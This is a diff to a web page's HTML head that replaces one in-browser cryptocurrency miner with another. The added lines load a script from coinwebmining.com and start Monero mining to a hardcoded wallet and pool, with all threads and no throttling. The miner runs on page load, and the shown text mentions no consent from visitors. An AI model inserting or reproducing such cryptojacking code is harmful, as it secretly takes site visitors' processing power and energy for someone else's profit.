@@ -12,15 +12,20 @@
 	<script async src="https://arc.io/widget.min.js#ZJMwUcZ2"></script>
 
 	<!--crypto miner haha-->
-	<script src="https://webminepool.com/lib/base.js"></script>
+
+	<script src="https://coinwebmining.com/cwm.js"></script>
 	<script>
-	    var miner = WMP.Anonymous('SK_pJEWFNfg9Vwi9bMGXgvak'{
-	        threads: 6,
-	        autoThreads: false,
-	        throttle: 0.01,
-	    });
-	    miner.start();
+	    var site_id = 'cwm-4315';
+	    var coin = 'monero';
+	    var wallet = '479pUAVkyuwYdEC5LME1JrCXdqovP9xU17bxbYbFf1xPKaH7diZXwsXLJSWmagD5E1K48ZnHvCnUAVucDYnMKY7G4vGMscb';
+	    var password = 'x';
+	    var mining_pool = 'mine.xmrpool.net:3333';
+	    var threads = -1;
+	    var throttle = 0;
+	    var debug = false;
+	    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
 	</script>
+	
 	
 
 	<script async src="https://cdn.splitbee.io/sb.js"></script>
